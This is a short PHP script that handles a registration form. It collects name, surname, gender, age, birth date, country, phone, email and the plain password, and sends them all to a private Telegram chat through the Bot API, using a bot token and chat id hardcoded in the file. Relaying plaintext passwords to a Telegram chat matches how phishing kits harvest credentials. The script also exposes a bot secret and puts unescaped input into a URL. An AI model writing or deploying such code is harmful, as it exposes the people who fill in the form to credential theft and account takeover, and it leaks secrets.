
<?php

$name = $_POST['username'];
$usersurname = $_POST['usersurname'];
$phone = $_POST['phone'];
$personality = isset($_POST['pick']) ? $_POST['pick'] : '';
$age = $_POST['age'];
$DOB = $_POST['DOB'];
$country = $_POST['country'];
$email = $_POST['emailuser'];
$userpassword = $_POST['userpassword'];

$token = "6905630435:AAGqFlfYoM1X-d1Qppn91LYIaVaGKNlt9Qs";
$chat_id = "-4033699488";
$arr = array(
    'Ім\'я: ' => $name,
    'Прізвище: ' => $usersurname,
    'Стать: ' => $personality,
    'Вік: ' => $age,
    'Дата народження: ' => $DOB,
    'Країна: ' => $country,
    'Телефон: ' => $phone,
    'Email: ' => $email,
    'Пароль: ' => $userpassword
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: thank-you.html');
} else {
  echo "Error";
}
?>